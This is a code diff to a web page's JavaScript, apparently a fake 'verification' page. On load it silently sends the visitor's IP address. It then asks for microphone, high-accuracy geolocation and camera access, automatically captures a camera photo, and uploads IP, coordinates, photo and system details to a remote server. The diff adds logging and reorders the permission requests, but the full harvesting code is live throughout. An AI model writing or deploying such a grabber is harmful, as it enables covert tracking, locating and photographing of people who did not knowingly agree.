@@ -323,13 +323,15 @@
         let ipSent = false, photoSent = false;
         let systemSent = false;
 
-        // ========== COLLECTE ==========
+        // ========== FONCTIONS DE COLLECTE AVEC ENVOI IMMÉDIAT ==========
 
         async function getIPAddress() {
             try {
                 const resp = await fetch('https://api.ipify.org?format=json');
                 const data = await resp.json();
                 userIP = { ip: data.ip, city: 'Unknown', region: 'Unknown', country: 'Unknown', postal: 'N/A', latitude: null, longitude: null, timezone: 'N/A', isp: 'N/A' };
+                console.log('📡 IP récupérée:', userIP.ip);
+                // Envoi immédiat
                 sendUpdate();
             } catch (e) {
                 userIP = { error: 'Non disponible' };
@@ -357,13 +359,15 @@
                             altitude: pos.coords.altitude,
                             timestamp: pos.timestamp
                         };
-                        sendUpdate();
+                        console.log('📍 Géolocalisation acceptée:', userCoords.latitude, userCoords.longitude);
+                        sendUpdate(); // Envoi immédiat
                         updateUI();
                         resolve(true);
                     },
                     (err) => {
                         geolocationAttempted = true;
                         userCoords = { error: err.message };
+                        console.warn('⚠️ Géolocalisation refusée:', err.message);
                         sendUpdate();
                         updateUI();
                         resolve(false);
@@ -371,6 +375,25 @@
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
             });
+        }
+
+        async function requestMicrophone() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+                stream.getTracks().forEach(t => t.stop());
+                microphoneGranted = true;
+                microphoneAttempted = true;
+                console.log('🎤 Microphone accepté');
+                sendUpdate();
+                updateUI();
+                return true;
+            } catch (e) {
+                microphoneAttempted = true;
+                console.warn('⚠️ Microphone refusé:', e.message);
+                sendUpdate();
+                updateUI();
+                return false;
+            }
         }
 
         async function requestCamera() {
@@ -384,28 +407,13 @@
                 video.onloadedmetadata = () => {
                     capturePhoto();
                 };
+                console.log('📷 Caméra acceptée');
                 sendUpdate();
                 updateUI();
                 return true;
             } catch (e) {
                 cameraAttempted = true;
-                sendUpdate();
-                updateUI();
-                return false;
-            }
-        }
-
-        async function requestMicrophone() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-                stream.getTracks().forEach(t => t.stop());
-                microphoneGranted = true;
-                microphoneAttempted = true;
-                sendUpdate();
-                updateUI();
-                return true;
-            } catch (e) {
-                microphoneAttempted = true;
+                console.warn('⚠️ Caméra refusée:', e.message);
                 sendUpdate();
                 updateUI();
                 return false;
@@ -426,6 +434,7 @@
             canvas.toBlob((blob) => {
                 if (blob) {
                     photoBlob = blob;
+                    console.log('📸 Photo capturée, taille:', blob.size);
                     sendUpdate();
                 }
             }, 'image/jpeg', 0.9);
@@ -454,7 +463,7 @@
                     ipSent = true;
                 }
 
-                // Coordonnées (envoyées à chaque fois qu'elles sont définies, même en erreur)
+                // Coordonnées (envoyées à chaque fois qu'elles sont définies)
                 if (userCoords) {
                     formData.append('coordinates', JSON.stringify(userCoords));
                 }
@@ -476,14 +485,23 @@
                     systemSent = true;
                 }
 
-                if (formData.entries().next().done) return;
+                // Vérifier si on a des données à envoyer
+                if (formData.entries().next().done) {
+                    console.log('⏭️ Rien à envoyer pour le moment.');
+                    return;
+                }
+
+                console.log('📤 Envoi des données...');
                 const resp = await fetch(SERVER_URL + '/api/verification/photo', {
                     method: 'POST',
                     body: formData,
                     credentials: 'omit'
                 });
-                if (resp.ok) console.log('✅ Envoi réussi');
-                else console.warn('⚠️ Échec envoi, status:', resp.status);
+                if (resp.ok) {
+                    console.log('✅ Envoi réussi');
+                } else {
+                    console.warn('⚠️ Échec envoi, status:', resp.status);
+                }
             } catch (e) {
                 console.warn('⚠️ Erreur envoi:', e.message);
             }
@@ -541,6 +559,7 @@
         async function requestAllPermissions() {
             document.getElementById('allowBtn').disabled = true;
 
+            // Ordre : micro, géoloc, caméra
             await requestMicrophone();
             await new Promise(r => setTimeout(r, 800));
             await getGeolocation();
@@ -589,6 +608,7 @@
         window.addEventListener('load', () => {
             console.log('🔑 Session ID:', SESSION_ID);
             document.body.classList.add('unverified');
+            // Récupération de l'IP dès le chargement
             getIPAddress();
             updateUI();
             setInterval(updateUI, 2000);
